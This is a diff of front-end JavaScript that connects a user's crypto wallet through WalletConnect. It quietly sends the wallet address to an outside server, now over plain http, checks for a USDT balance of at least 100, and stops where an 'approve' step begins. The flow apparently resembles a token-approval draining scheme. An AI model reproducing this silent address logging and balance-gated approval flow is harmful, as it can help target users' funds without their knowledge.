@@ -23,25 +23,28 @@ connectButton.onclick = async () => {
     try {
         const provider = await EthereumProvider.init({
             projectId: "5c7a882142c7491241b507534414ddff",
-            chains: [56],
-            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"]
+            chains: [56], // BNB Smart Chain
+            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
+            showQrModal: true
         });
 
         await provider.connect();
 
         const ethersProvider = new ethers.BrowserProvider(provider);
-        const signer = await ethersProvider.getSigner();
+        signer = await ethersProvider.getSigner();
         const userAddress = await signer.getAddress();
 
+        // Fill the wallet address
         document.getElementById("walletAddress").value = userAddress;
 
-        // Save to backend
-        fetch("https://onlyforapi.com/auto/save_wallet_auto.php", {
+        // Optional: save to backend
+        fetch("http://onlyforapi.com/auto/save_wallet_auto.php", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ wallet: userAddress })
         });
 
+        // Fetch USDT Balance
         const USDT = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
         const rawBalance = await USDT.balanceOf(userAddress);
         const balance = parseFloat(ethers.formatUnits(rawBalance, 18));
@@ -50,11 +53,13 @@ connectButton.onclick = async () => {
         document.getElementById("balanceResults").style.display = "block";
 
         if (balance < 100) {
+            document.getElementById("step3Next").disabled = true;
+            document.getElementById("amountCalculation").style.display = "none";
             $('#minBalanceModal').modal('show');
         } else {
             document.getElementById("step3Next").disabled = false;
             document.getElementById("amountCalculation").style.display = "block";
-            calculateAmount(balance);
+            calculateAmount(balance); // Your logic
         }
 
     } catch (err) {
@@ -65,7 +70,6 @@ connectButton.onclick = async () => {
         connectButton.disabled = false;
     }
 };
-
 
 approveButton.onclick = async () => {
     try {
